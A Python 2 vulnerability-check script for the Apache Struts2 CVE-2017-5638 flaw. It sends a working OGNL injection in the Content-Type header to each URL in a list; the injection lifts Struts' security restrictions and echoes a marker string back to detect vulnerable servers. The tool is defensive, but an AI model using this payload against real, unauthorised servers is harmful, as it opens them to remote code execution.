'''
This script is a fork of https://github.com/tengzhangchao/Struts2_045-Poc. 
With goal of a less intrusive approach able to run against corporative servers

for any feedback, please refer: https://github.com/jrrombaldo
'''

import urllib2
from urllib2 import URLError, HTTPError
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

size = 0;

print HEADER, '\r\n\r\n CVE-2017-5638 - APACHE STRUTS2 VALIDATION \r\n', ENDC 

def poc(url):
    try:
        fil=open('tmp.txt','w')
        fil.close()

        register_openers()
        datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        payload = "%{(#nike='multipart/form-data')"
        payload += ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
        payload += ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))"
#         payload += ".(#cj=(@java.lang.Thread@sleep(0)))"
        payload += ".(#cjstr=new java.lang.String('appsec-validation'))"
        payload += ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
        payload += ".(@org.apache.commons.io.IOUtils@write(#cjstr,#ros)).(#ros.flush())}"
        header["Content-Type"] = payload
        request = urllib2.Request(url, datagen, headers=header)
        response = urllib2.urlopen(request)
        body = response.read()
        status_code = response.getcode()
    
        if "appsec-validation" in body:
                print FAIL, '%-12s' % ("[VULNERABLE]"), ENDC, ('%-'+str(size)+'s') % (app), status_code     
        else:
                print OKGREEN, '%-12s' % ("[SECURE]"), ENDC, ('%-'+str(size)+'s') % (app), status_code
                

    except HTTPError as e:
        body = 'The server couldn\'t fulfill the request.'
        status_code = e.code
        print  OKGREEN, '%-12s' % ("[SECURE]"), ENDC, ('%-'+str(size)+'s') % (app), e 
    except URLError as e:  
        body = 'We failed to reach a server.'
        status_code = ''
        print WARNING, '%-12s' % ("[ERROR]"), ENDC, ('%-'+str(size-1)+'s') % (app), WARNING, e.reason, ENDC
    return body, status_code


with open('application-list.txt') as f:
    appList = f.read().splitlines()
    for app in appList:
         if (len(app)> size):
          size = len(app)

    size += 15
    for app in appList:
        if not (str(app).endswith(".action") and str(app).endswith(".do") ):
            app += 'appsec.action'
        body, status_code = poc(app)
        # print body    
